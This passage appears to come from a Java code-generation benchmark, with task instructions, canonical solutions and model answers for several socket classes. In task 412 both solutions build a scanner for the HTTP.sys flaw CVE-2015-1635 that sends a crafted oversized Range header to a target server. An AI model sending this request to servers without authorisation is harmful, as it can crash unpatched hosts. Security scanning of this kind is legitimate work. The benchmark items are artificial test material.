    "Task_id": 410,
    "Instruction": "Task Description: Create a Java class that establishes a TCP connection to a server, sends commands, and receives responses, including the ability to list files and receive image data from the server.\n\nClass Description: The DeviceConnection class manages a TCP socket connection to a server, providing methods to interact with the server by sending commands and processing responses. It handles both text-based communication and binary image data transfer, with optional ZIP compression support.\n\nAttributes:\n- socket: Socket - The TCP socket connection to the server\n- reader: Reader - Inner class for reading data from the server\n- writer: Writer - Inner class for writing data to the server\n- USE_ZIP: boolean - Flag indicating whether to use ZIP compression for image data\n\nMethods:\n- DeviceConnection() -> void - Constructor that establishes a connection to the server at localhost:4242\n- close() -> void - Closes the socket connection\n- listLayoutFiles() -> ArrayList<String> - Requests and returns a list of layout files from the server\n- takePicture() -> Image - Requests an image from the server and returns it as a BufferedImage\n- complete() -> void - Verifies the completion of a server operation\n- Reader(InputStream) -> void - Inner class constructor for reading data\n- nextLine() -> String - Reads a line of text from the server (Reader class method)\n- Writer(OutputStream) -> void - Inner class constructor for writing data\n- println(String) -> void - Writes a line of text to the server (Writer class method)",
    "Canonical_solution": "import java.awt.Image;\nimport java.awt.image.BufferedImage;\nimport java.io.*;\nimport java.net.Socket;\nimport java.nio.ByteBuffer;\nimport java.nio.ByteOrder;\nimport java.nio.IntBuffer;\nimport java.util.ArrayList;\nimport java.util.zip.ZipInputStream;\n\npublic class DeviceConnection {\n    private static final boolean USE_ZIP = true;\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n\n    public DeviceConnection() {\n        try {\n            socket = new Socket(\"localhost\", 4242);\n            reader = new Reader(socket.getInputStream());\n            writer = new Writer(socket.getOutputStream());\n        } catch (IOException e) {\n            System.err.println(\"Did you \\\"adb forward tcp:4242 tcp:4242\\\"\");\n            e.printStackTrace();\n        }\n    }\n\n    public void close() {\n        try {\n            if (socket != null) {\n                socket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public ArrayList<String> listLayoutFiles() {\n        ArrayList<String> files = new ArrayList<>();\n        if (writer == null) {\n            return files;\n        }\n        writer.println(\"LIST\");\n        boolean done = false;\n        while (!done) {\n            String response = reader.nextLine();\n            if (response.equals(\"DONE\")) {\n                done = true;\n            } else {\n                files.add(response);\n                System.out.println(\"Server response: \" + response);\n            }\n        }\n        return files;\n    }\n\n    public Image takePicture() {\n        writer.println(\"TAKE_PICTURE\");\n        String response = reader.nextLine();\n        int w = Integer.parseInt(response);\n        response = reader.nextLine();\n        int h = Integer.parseInt(response);\n        response = reader.nextLine();\n        int size = Integer.parseInt(response);\n        if (size == 0) {\n            complete();\n            return null;\n        }\n        byte[] bytes = new byte[size];\n        BufferedImage image = null;\n        try {\n            InputStream inputStream = reader.stream;\n            int offset = 0;\n            while (offset < size) {\n                int toRead = size - offset;\n                int read = inputStream.read(bytes, offset, toRead);\n                if (read > 0) {\n                    offset += read;\n                }\n            }\n            if (USE_ZIP) {\n                try {\n                    ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);\n                    ZipInputStream zipInputStream = new ZipInputStream(byteArrayInputStream);\n                    zipInputStream.getNextEntry();\n                    ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();\n                    byte[] buff = new byte[32768];\n                    int len = 0;\n                    while ((len = zipInputStream.read(buff)) > 0) {\n                        byteArrayOutputStream.write(buff, 0, len);\n                    }\n                    zipInputStream.closeEntry();\n                    zipInputStream.close();\n                    bytes = byteArrayOutputStream.toByteArray();\n                } catch(IOException e){\n                    e.printStackTrace();\n                }\n            }\n\n            image = new BufferedImage(w, h, BufferedImage.TYPE_INT_ARGB);\n            IntBuffer intBuffer = ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asIntBuffer();\n            int[] array = new int[intBuffer.remaining()];\n            intBuffer.get(array);\n            for (int i = 0; i < array.length; i++) {\n                int pixel = array[i];\n                int alpha = (pixel >> 24) & 0xff;\n                int red = (pixel >> 16) & 0xff;\n                int green = (pixel >> 8) & 0xff;\n                int blue = (pixel) & 0xff;\n                array[i] = (alpha << 24) + (blue << 16) + (green << 8) + red;\n            }\n            image.getRaster().setDataElements(0, 0, w, h, array);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n        complete();\n        return image;\n    }\n\n    private class Reader {\n        DataInputStream stream;\n\n        Reader(InputStream stream) {\n            this.stream = new DataInputStream(stream);\n        }\n\n        String nextLine() {\n            try {\n                return stream.readUTF();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n            return \"\";\n        }\n    }\n\n    private class Writer {\n        DataOutputStream stream;\n\n        Writer(OutputStream stream) {\n            this.stream = new DataOutputStream(stream);\n        }\n\n        void println(String text) {\n            try {\n                stream.writeUTF(text);\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void complete() {\n        String done = reader.nextLine();\n        if (!done.equals(\"DONE\")) {\n            System.out.println(\"WTF!!\");\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\nimport java.util.zip.ZipInputStream;\n\npublic class DeviceConnection {\n    private Socket socket;\n    private Reader reader;\n    private Writer writer;\n    private boolean USE_ZIP = true;\n\n    public DeviceConnection() throws IOException {\n        socket = new Socket(\"localhost\", 4242);\n        reader = new Reader(socket.getInputStream());\n        writer = new Writer(socket.getOutputStream());\n    }\n\n    public void close() throws IOException {\n        reader.close();\n        writer.close();\n        socket.close();\n    }\n\n    public ArrayList<String> listLayoutFiles() throws IOException {\n        writer.println(\"list_layouts\");\n        int count = Integer.parseInt(reader.nextLine());\n        ArrayList<String> files = new ArrayList<>();\n        for (int i = 0; i < count; i++) {\n            files.add(reader.nextLine());\n        }\n        return files;\n    }\n\n    public BufferedImage takePicture() throws IOException {\n        writer.println(\"take_picture\");\n        String header = reader.nextLine();\n        if (!header.equals(\"image_data\")) {\n            throw new IOException(\"Unexpected response: \" + header);\n        }\n        boolean isZipped = Boolean.parseBoolean(reader.nextLine());\n\n        InputStream imageStream = socket.getInputStream();\n        if (isZipped && USE_ZIP) {\n            imageStream = new ZipInputStream(imageStream);\n        }\n\n        BufferedImage image = ImageIO.read(imageStream);\n        complete();\n        return image;\n    }\n\n    public void complete() throws IOException {\n        writer.println(\"complete\");\n        String response = reader.nextLine();\n        if (!response.equals(\"done\")) {\n            throw new IOException(\"Operation failed: \" + response);\n        }\n    }\n\n    private class Reader {\n        private BufferedReader bufferedReader;\n        private StringBuilder currentLine;\n\n        Reader(InputStream inputStream) {\n            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));\n            currentLine = new StringBuilder();\n        }\n\n        String nextLine() throws IOException {\n            currentLine.setLength(0);\n            int c;\n            while ((c = bufferedReader.read()) != -1) {\n                if (c == '\\n') break;\n                currentLine.append((char) c);\n            }\n            return currentLine.toString();\n        }\n\n        void close() throws IOException {\n            bufferedReader.close();\n        }\n    }\n\n    private class Writer {\n        private BufferedWriter bufferedWriter;\n\n        Writer(OutputStream outputStream) {\n            bufferedWriter = new BufferedWriter(new OutputStreamWriter(outputStream));\n        }\n\n        void println(String s) throws IOException {\n            bufferedWriter.write(s);\n            bufferedWriter.newLine();\n            bufferedWriter.flush();\n        }\n\n        void close() throws IOException {\n            bufferedWriter.close();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 411,
    "Instruction": "Task Description: Implement a TCP client class in Java that establishes a connection to a server, handles bidirectional communication using object serialization, and manages various types of data frames for benchmarking purposes.\n\nClass Description: BinaryLinkClient is a TCP client implementation that connects to a benchmarking server, exchanging serialized data frames for coordinating benchmark execution, handling results, and managing output streams. It features thread-safe frame pushing, error handling, and resource management.\n\nAttributes:\n- lock: Object - Synchronization object for thread safety\n- clientSocket: Socket - TCP socket connection to the server\n- oos: ObjectOutputStream - Output stream for sending serialized objects\n- ois: ObjectInputStream - Input stream for receiving serialized objects\n- streamErr: ForwardingPrintStream - Error output stream that forwards to server\n- streamOut: ForwardingPrintStream - Standard output stream that forwards to server\n- outputFormat: OutputFormat - Proxy for formatting output frames\n- failed: boolean - Flag indicating connection failure state\n- resetToGo: int - Counter for periodic stream resets\n- delayedFrames: List<Serializable> - Buffer for frames during nested pushes\n- inFrame: boolean - Flag indicating ongoing frame transmission\n\nMethods:\n- BinaryLinkClient(String hostName, int hostPort) -> void - Constructor establishing connection to specified host:port\n- pushFrame(Serializable frame) -> void - Thread-safe method to send a serializable frame to server\n- readFrame() -> Object - Reads and returns the next frame from server\n- close() -> void - Closes all connections and streams\n- handshake() -> Options - Performs initial handshake with server, returns benchmark options\n- requestPlan() -> ActionPlan - Requests benchmark action plan from server\n- pushResults(IterationResult res) -> void - Sends benchmark results to server\n- pushException(BenchmarkException error) -> void - Sends benchmark exception to server\n- pushResultMetadata(BenchmarkResultMetaData res) -> void - Sends result metadata to server\n- getOutStream() -> PrintStream - Returns standard output stream\n- getErrStream() -> PrintStream - Returns error output stream\n- getOutputFormat() -> OutputFormat - Returns output format proxy\n\nInner Class:\n- ForwardingPrintStream - Custom PrintStream that forwards output to server as frames",
    "Canonical_solution": "import org.openjdk.jmh.runner.link.*;\nimport org.openjdk.jmh.runner.ActionPlan;\nimport org.openjdk.jmh.runner.BenchmarkException;\nimport org.openjdk.jmh.runner.format.OutputFormat;\nimport org.openjdk.jmh.runner.options.Options;\nimport org.openjdk.jmh.util.FileUtils;\nimport org.openjdk.jmh.util.Utils;\n\nimport java.io.*;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Method;\nimport java.lang.reflect.Proxy;\nimport java.net.Socket;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\n\npublic final class BinaryLinkClient {\n\n    private static final int RESET_EACH = Integer.getInteger(\"jmh.link.resetEach\", 100);\n    private static final int BUFFER_SIZE = Integer.getInteger(\"jmh.link.bufferSize\", 64*1024);\n\n    private final Object lock;\n    private final Socket clientSocket;\n    private final ObjectOutputStream oos;\n    private final ObjectInputStream ois;\n    private final ForwardingPrintStream streamErr;\n    private final ForwardingPrintStream streamOut;\n    private final OutputFormat outputFormat;\n    private volatile boolean failed;\n    private int resetToGo;\n    private final List<Serializable> delayedFrames;\n    private boolean inFrame;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        this.lock = new Object();\n        this.clientSocket = new Socket(hostName, hostPort);\n        this.oos = new ObjectOutputStream(new BufferedOutputStream(clientSocket.getOutputStream(), BUFFER_SIZE));\n        this.oos.flush();\n        this.ois = new ObjectInputStream(new BufferedInputStream(clientSocket.getInputStream(), BUFFER_SIZE));\n        this.streamErr = new ForwardingPrintStream(OutputFrame.Type.ERR);\n        this.streamOut = new ForwardingPrintStream(OutputFrame.Type.OUT);\n        this.outputFormat = (OutputFormat) Proxy.newProxyInstance(\n                Thread.currentThread().getContextClassLoader(),\n                new Class[]{OutputFormat.class},\n                (proxy, method, args) -> {\n                    pushFrame(new OutputFormatFrame(ClassConventions.getMethodName(method), args));\n                    return null;\n                }\n        );\n        this.delayedFrames = new ArrayList<>();\n    }\n\n    private void pushFrame(Serializable frame) throws IOException {\n        if (failed) {\n            throw new IOException(\"Link had failed already\");\n        }\n\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n                return;\n            }\n\n            try {\n                inFrame = true;\n\n                if (resetToGo-- < 0) {\n                    oos.reset();\n                    resetToGo = RESET_EACH;\n                }\n\n                oos.writeObject(frame);\n                oos.flush();\n\n                while (!delayedFrames.isEmpty()) {\n                    List<Serializable> frames = new ArrayList<>(delayedFrames);\n                    delayedFrames.clear();\n                    for (Serializable f : frames) {\n                        oos.writeObject(f);\n                    }\n                    oos.flush();\n                }\n            } catch (IOException e) {\n                failed = true;\n                throw e;\n            } finally {\n                inFrame = false;\n            }\n        }\n    }\n\n    private Object readFrame() throws IOException, ClassNotFoundException {\n        try {\n            return ois.readObject();\n        } catch (ClassNotFoundException | IOException ex) {\n            failed = true;\n            throw ex;\n        }\n    }\n\n    public void close() throws IOException {\n        FileUtils.safelyClose(streamErr);\n        FileUtils.safelyClose(streamOut);\n\n        synchronized (lock) {\n            oos.writeObject(new FinishingFrame());\n            FileUtils.safelyClose(ois);\n            FileUtils.safelyClose(oos);\n            clientSocket.close();\n        }\n    }\n\n    public Options handshake() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new HandshakeInitFrame(Utils.getPid()));\n            Object reply = readFrame();\n            if (reply instanceof HandshakeResponseFrame) {\n                return (((HandshakeResponseFrame) reply).getOpts());\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public ActionPlan requestPlan() throws IOException, ClassNotFoundException {\n        synchronized (lock) {\n            pushFrame(new InfraFrame(InfraFrame.Type.ACTION_PLAN_REQUEST));\n            Object reply = readFrame();\n            if (reply instanceof ActionPlanFrame) {\n                return ((ActionPlanFrame) reply).getActionPlan();\n            } else {\n                throw new IllegalStateException(\"Got the erroneous reply: \" + reply);\n            }\n        }\n    }\n\n    public void pushResults(IterationResult res) throws IOException {\n        pushFrame(new ResultsFrame(res));\n    }\n\n    public void pushException(BenchmarkException error) throws IOException {\n        pushFrame(new ExceptionFrame(error));\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) throws IOException {\n        pushFrame(new ResultMetadataFrame(res));\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    class ForwardingPrintStream extends PrintStream {\n        public ForwardingPrintStream(final OutputFrame.Type type) {\n            super(new OutputStream() {\n                @Override\n                public void write(int b) throws IOException {\n                    pushFrame(new OutputFrame(type, new byte[]{(byte) (b & 0xFF)}));\n                }\n\n                @Override\n                public void write(byte[] b) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOf(b, b.length)));\n                }\n\n                @Override\n                public void write(byte[] b, int off, int len) throws IOException {\n                    pushFrame(new OutputFrame(type, Arrays.copyOfRange(b, off, len + off)));\n                }\n            });\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class BinaryLinkClient {\n    private final Object lock = new Object();\n    private Socket clientSocket;\n    private ObjectOutputStream oos;\n    private ObjectInputStream ois;\n    private ForwardingPrintStream streamErr;\n    private ForwardingPrintStream streamOut;\n    private OutputFormat outputFormat;\n    private boolean failed = false;\n    private int resetToGo = 0;\n    private List<Serializable> delayedFrames = new ArrayList<>();\n    private boolean inFrame = false;\n\n    public BinaryLinkClient(String hostName, int hostPort) throws IOException {\n        clientSocket = new Socket(hostName, hostPort);\n        oos = new ObjectOutputStream(clientSocket.getOutputStream());\n        ois = new ObjectInputStream(clientSocket.getInputStream());\n        streamOut = new ForwardingPrintStream(oos, true);\n        streamErr = new ForwardingPrintStream(oos, false);\n        outputFormat = new OutputFormat(streamOut);\n    }\n\n    public void pushFrame(Serializable frame) {\n        synchronized (lock) {\n            if (inFrame) {\n                delayedFrames.add(frame);\n            } else {\n                try {\n                    inFrame = true;\n                    oos.writeObject(frame);\n                    oos.flush();\n                } catch (IOException e) {\n                    failed = true;\n                } finally {\n                    inFrame = false;\n                    if (!delayedFrames.isEmpty()) {\n                        for (Serializable f : delayedFrames) {\n                            try {\n                                oos.writeObject(f);\n                                oos.flush();\n                            } catch (IOException ex) {\n                                failed = true;\n                                break;\n                            }\n                        }\n                        delayedFrames.clear();\n                    }\n                }\n            }\n        }\n    }\n\n    public Object readFrame() {\n        try {\n            return ois.readObject();\n        } catch (IOException | ClassNotFoundException e) {\n            close();\n            return null;\n        }\n    }\n\n    public void close() {\n        try {\n            if (ois != null) ois.close();\n            if (oos != null) oos.close();\n            if (clientSocket != null) clientSocket.close();\n        } catch (IOException ignored) {}\n    }\n\n    public Options handshake() {\n        try {\n            Object response = readFrame();\n            if (response instanceof Options) {\n                return (Options) response;\n            }\n        } catch (Exception e) {\n            close();\n        }\n        return null;\n    }\n\n    public ActionPlan requestPlan() {\n        try {\n            pushFrame(new RequestActionPlan());\n            Object response = readFrame();\n            if (response instanceof ActionPlan) {\n                return (ActionPlan) response;\n            }\n        } catch (Exception e) {\n            close();\n        }\n        return null;\n    }\n\n    public void pushResults(IterationResult res) {\n        pushFrame(res);\n    }\n\n    public void pushException(BenchmarkException error) {\n        pushFrame(error);\n    }\n\n    public void pushResultMetadata(BenchmarkResultMetaData res) {\n        pushFrame(res);\n    }\n\n    public PrintStream getOutStream() {\n        return streamOut;\n    }\n\n    public PrintStream getErrStream() {\n        return streamErr;\n    }\n\n    public OutputFormat getOutputFormat() {\n        return outputFormat;\n    }\n\n    private class ForwardingPrintStream extends PrintStream {\n        private final boolean isOut;\n\n        public ForwardingPrintStream(ObjectOutputStream oos, boolean isOut) {\n            super(new ByteArrayOutputStream());\n            this.isOut = isOut;\n        }\n\n        @Override\n        public void write(byte[] buf, int off, int len) {\n            String data = new String(buf, off, len);\n            if (isOut) {\n                pushFrame(new OutputFrame(data));\n            } else {\n                pushFrame(new ErrorFrame(data));\n            }\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 412,
    "Instruction": "Task Description: Create a Java class that checks for a specific vulnerability (HTTP.sys Remote Code Execution) in a target server using TCP client communication.\n\nClass Description: The HttpSysRCEClient class is designed to detect the presence of the CVE-2015-1635 (MS15-034) vulnerability in a target HTTP server by sending specially crafted HTTP requests and analyzing the responses. It utilizes TCP socket communication to interact with the server.\n\nAttributes:\n- target: String - The URL of the target server to be checked\n- task: Task - An object containing task-related information and results\n\nMethods:\n- HttpSysRCEClient(String target, Task task) -> None - Constructor that initializes the target URL and task object\n- checkVulnerability() -> void - Main method that performs the vulnerability check by:\n  1. Establishing TCP connection to the target server\n  2. Sending crafted HTTP requests with malicious Range headers\n  3. Analyzing responses for vulnerability indicators\n  4. Adding vulnerability to task results if detected\n- addVulnerable() -> void - Helper method that adds vulnerability information to the task results when detected",
    "Canonical_solution": "import com.trackray.base.bean.Task;\nimport com.trackray.base.bean.Vulnerable;\nimport com.trackray.base.utils.IOUtils;\nimport com.trackray.base.utils.SysLog;\nimport org.apache.commons.lang3.StringUtils;\n\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\nimport java.net.URL;\nimport java.util.Arrays;\nimport java.util.concurrent.Callable;\nimport java.util.concurrent.FutureTask;\nimport java.util.concurrent.TimeUnit;\n\npublic class HttpSysRCEClient {\n\n    private String target;\n    private Task task;\n\n    public HttpSysRCEClient(String target, Task task) {\n        this.target = target;\n        this.task = task;\n    }\n\n    public void checkVulnerability() {\n        try {\n            URL url = new URL(target);\n            String host = url.getHost();\n            int port = url.getPort();\n\n            Socket socket = new Socket(host, port);\n\n            Callable<String> callable = new Callable<String>() {\n                @Override\n                public String call() throws Exception {\n                    String hexAllFfff = \"18446744073709551615\";\n                    String req = \"GET / HTTP/1.0\\r\\nHost: \" + host + \"\\r\\nRange: bytes=0-\" + hexAllFfff + \"\\r\\n\\r\\n\";\n\n                    InputStream inputStream = socket.getInputStream();\n                    OutputStream outputStream = socket.getOutputStream();\n\n                    outputStream.write(req.getBytes());\n                    outputStream.flush();\n\n                    return IOUtils.analysisStream(inputStream);\n                }\n            };\n\n            FutureTask<String> futureTask = new FutureTask<>(callable);\n            futureTask.run();\n            \n            try {\n                String result = futureTask.get(30, TimeUnit.SECONDS);\n                if (StringUtils.contains(result, \"Requested Range Not Satisfiable\")) {\n                    addVulnerable();\n                }\n            } catch (Exception e) {\n                Socket newSocket = new Socket(host, port);\n\n                callable = new Callable<String>() {\n                    @Override\n                    public String call() throws Exception {\n                        String hexAllFfff = \"18446744073709551615\";\n                        String req = \"GET / HTTP/1.1\\r\\nHost: \" + host + \"\\r\\nRange: bytes=0-\" + hexAllFfff + \"\\r\\n\\r\\n\";\n\n                        InputStream inputStream = newSocket.getInputStream();\n                        OutputStream outputStream = newSocket.getOutputStream();\n\n                        outputStream.write(req.getBytes());\n                        outputStream.flush();\n\n                        return IOUtils.analysisStream(inputStream);\n                    }\n                };\n\n                futureTask.cancel(true);\n                futureTask = new FutureTask<>(callable);\n                futureTask.run();\n                \n                try {\n                    String result = futureTask.get(30, TimeUnit.SECONDS);\n                    if (StringUtils.contains(result, \"Requested Range Not Satisfiable\")) {\n                        addVulnerable();\n                    }\n                } catch (Exception ee) {\n                } finally {\n                    futureTask.cancel(true);\n                    newSocket.close();\n                }\n            } finally {\n                socket.close();\n            }\n        } catch (Exception e) {\n            SysLog.error(e);\n        }\n    }\n\n    private void addVulnerable() {\n        task.getResult().addVulnerable(\n            Vulnerable.builder()\n                .title(\"HTTP.sys \u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\")\n                .address(target)\n                .level(Vulnerable.Level.HIGH.getLevel())\n                .type(Vulnerable.Type.CODE_EXECUTION.getType())\n                .vulnId(Arrays.asList(\"CVE-2015-1635\", \"MS15-034\"))\n                .build()\n        );\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.*;\n\npublic class HttpSysRCEClient {\n    private String target;\n    private Task task;\n\n    public HttpSysRCEClient(String target, Task task) {\n        this.target = target;\n        this.task = task;\n    }\n\n    public void checkVulnerability() {\n        try {\n            int port = 80;\n            String host = new java.net.URL(target).getHost();\n            Socket socket = new Socket();\n            socket.connect(new InetSocketAddress(host, port), 10000);\n            OutputStream os = socket.getOutputStream();\n            InputStream is = socket.getInputStream();\n\n            String request = \"GET / HTTP/1.1\\r\\n\"\n                    + \"Host: \" + host + \"\\r\\n\"\n                    + \"Range: bytes=0-18446744073709551615\\r\\n\"\n                    + \"Connection: close\\r\\n\"\n                    + \"\\r\\n\";\n\n            os.write(request.getBytes());\n            os.flush();\n\n            byte[] buffer = new byte[4096];\n            int bytesRead = is.read(buffer);\n            String response = new String(buffer, 0, bytesRead);\n\n            if (response.contains(\"HTTP/1.1 416 Requested Range Not Satisfiable\")) {\n                addVulnerable();\n            }\n\n            socket.close();\n        } catch (Exception e) {\n            // Ignore exceptions for now\n        }\n    }\n\n    private void addVulnerable() {\n        Map<String, Object> result = new HashMap<>();\n        result.put(\"vulnerable\", true);\n        result.put(\"cve\", \"CVE-2015-1635\");\n        task.addResult(result);\n    }\n}\n```"
  },
  {
    "Task_id": 416,
    "Instruction": "Task Description: Create a Java class that implements file transfer functionality over TCP/IP protocol, including connection establishment, header and body parsing, and proper resource cleanup. The class should support progress monitoring through callbacks.\n\nClass Description: FileSender is a class that handles sending files to a remote server using TCP sockets. It implements Runnable for asynchronous operation and extends BaseTransfer for common transfer functionality. The class manages the entire file transfer process including connection setup, metadata transmission, file content streaming, and cleanup.\n\nAttributes:\n- mServerIpAddress: String - IP address of the server to connect to\n- mPort: int - Port number of the server\n- mFileInfo: FileInfo - Contains metadata about the file to be sent\n- mSocket: Socket - TCP socket for communication with server\n- mOutputStream: OutputStream - Buffered output stream for sending data\n- mOnSendListener: OnSendListener - Callback interface for transfer events\n\nMethods:\n- FileSender(Context, FileInfo, String, int) -> None - Constructor that initializes the file transfer parameters\n- setOnSendListener(OnSendListener) -> None - Sets the callback listener for transfer events\n- run() -> None - Main execution method called when the thread starts (implements Runnable)\n- init() -> None - Initializes the socket connection and output stream\n- parseHeader() -> None - Sends file metadata in a formatted header\n- parseBody() -> None - Streams the file content to the server\n- finish() -> None - Cleans up resources (closes streams and socket)\n- OnSendListener: Interface - Callback interface with methods for transfer events:\n  - onStart() -> None - Called when transfer begins\n  - onProgress(long, long) -> None - Called with progress updates\n  - onSuccess(FileInfo) -> None - Called on successful transfer\n  - onFailure(Throwable, FileInfo) -> None - Called if transfer fails",
    "Canonical_solution": "import android.content.Context;\nimport java.io.BufferedOutputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class FileSender extends BaseTransfer implements Runnable {\n\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo mFileInfo, String mServerIpAddress, int mPort) {\n        this.mFileInfo = mFileInfo;\n        this.mServerIpAddress = mServerIpAddress;\n        this.mPort = mPort;\n    }\n\n    public void setOnSendListener(OnSendListener mOnSendListener) {\n        this.mOnSendListener = mOnSendListener;\n    }\n\n    @Override\n    public void run() {\n        try {\n            if(mOnSendListener != null) mOnSendListener.onStart();\n            init();\n            parseHeader();\n            parseBody();\n            finish();\n            if(mOnSendListener != null) mOnSendListener.onSuccess(mFileInfo);\n        } catch (Exception e) {\n            if(mOnSendListener != null) mOnSendListener.onFailure(e, mFileInfo);\n        }\n    }\n\n    @Override\n    public void init() throws Exception {\n        this.mSocket = new Socket(mServerIpAddress, mPort);\n        OutputStream os = this.mSocket.getOutputStream();\n        mOutputStream = new BufferedOutputStream(os);\n    }\n\n    @Override\n    public void parseHeader() throws Exception {\n        StringBuilder headerSb = new StringBuilder();\n        String jsonStr = FileInfo.toJsonStr(mFileInfo);\n        jsonStr = TYPE_FILE + SPERATOR + jsonStr;\n        headerSb.append(jsonStr);\n        int leftLen = BYTE_SIZE_HEADER - jsonStr.getBytes(UTF_8).length;\n        for(int i=0; i < leftLen; i++){\n            headerSb.append(\" \");\n        }\n        byte[] headbytes = headerSb.toString().getBytes(UTF_8);\n        mOutputStream.write(headbytes);\n    }\n\n    @Override\n    public void parseBody() throws Exception {\n        InputStream fis = new FileInputStream(new File(mFileInfo.getFilePath()));\n        byte[] bytes = new byte[BYTE_SIZE_DATA];\n        int len = 0;\n        while((len=fis.read(bytes)) != -1){\n            mOutputStream.write(bytes, 0, len);\n            if(mOnSendListener != null) mOnSendListener.onProgress(fis.available(), mFileInfo.getSize());\n        }\n        mOutputStream.flush();\n        mOutputStream.close();\n    }\n\n    @Override\n    public void finish() {\n        try {\n            if(mOutputStream != null) mOutputStream.close();\n            if(mSocket != null && mSocket.isConnected()) mSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long progress, long total);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable t, FileInfo fileInfo);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 15,
    "right_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class FileSender extends BaseTransfer implements Runnable {\n    private String mServerIpAddress;\n    private int mPort;\n    private FileInfo mFileInfo;\n    private Socket mSocket;\n    private OutputStream mOutputStream;\n    private OnSendListener mOnSendListener;\n\n    public FileSender(Context context, FileInfo fileInfo, String serverIpAddress, int port) {\n        super(context);\n        mFileInfo = fileInfo;\n        mServerIpAddress = serverIpAddress;\n        mPort = port;\n    }\n\n    public void setOnSendListener(OnSendListener listener) {\n        mOnSendListener = listener;\n    }\n\n    @Override\n    public void run() {\n        try {\n            init();\n            if (mOnSendListener != null) {\n                mOnSendListener.onStart();\n            }\n            parseHeader();\n            parseBody();\n            if (mOnSendListener != null) {\n                mOnSendListener.onSuccess(mFileInfo);\n            }\n        } catch (Exception e) {\n            if (mOnSendListener != null) {\n                mOnSendListener.onFailure(e, mFileInfo);\n            }\n        } finally {\n            finish();\n        }\n    }\n\n    private void init() throws IOException {\n        mSocket = new Socket(mServerIpAddress, mPort);\n        mOutputStream = new BufferedOutputStream(mSocket.getOutputStream());\n    }\n\n    private void parseHeader() throws IOException {\n        String header = \"FILENAME:\" + mFileInfo.getFileName() +\n                \"|SIZE:\" + mFileInfo.getFileSize() +\n                \"|TYPE:\" + mFileInfo.getFileType();\n        mOutputStream.write(header.getBytes());\n        mOutputStream.flush();\n    }\n\n    private void parseBody() throws IOException {\n        FileInputStream fileInputStream = new FileInputStream(mFileInfo.getFilePath());\n        byte[] buffer = new byte[8192];\n        int bytesRead;\n        long totalBytesSent = 0;\n\n        while ((bytesRead = fileInputStream.read(buffer)) > 0) {\n            mOutputStream.write(buffer, 0, bytesRead);\n            totalBytesSent += bytesRead;\n            if (mOnSendListener != null) {\n                mOnSendListener.onProgress(totalBytesSent, mFileInfo.getFileSize());\n            }\n        }\n\n        mOutputStream.flush();\n        fileInputStream.close();\n    }\n\n    private void finish() {\n        try {\n            if (mOutputStream != null) {\n                mOutputStream.close();\n            }\n            if (mSocket != null && !mSocket.isClosed()) {\n                mSocket.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public interface OnSendListener {\n        void onStart();\n        void onProgress(long bytesSent, long totalBytes);\n        void onSuccess(FileInfo fileInfo);\n        void onFailure(Throwable throwable, FileInfo fileInfo);\n    }\n}\n```"
  },
  {
    "Task_id": 417,
